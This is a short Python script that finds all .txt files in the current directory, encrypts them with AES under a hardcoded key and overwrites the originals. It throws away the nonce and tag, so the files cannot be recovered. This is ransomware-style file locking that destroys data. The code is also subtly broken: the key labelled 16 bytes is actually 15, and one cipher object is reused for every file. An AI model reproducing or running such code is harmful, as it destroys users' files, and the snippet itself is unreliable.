from Crypto.Cipher import AES
import os

key = b"This_is_16_byte"
cipher = AES.new(key, AES.MODE_EAX)

files = [f for f in os.listdir() if f.endswith('.txt')]

for file in files:
    with open(file, "rb") as f:
        data = f.read()
    ciphertext, tag = cipher.encrypt_and_digest(data)
    with open(file, "wb") as f:
        f.write(ciphertext)
      
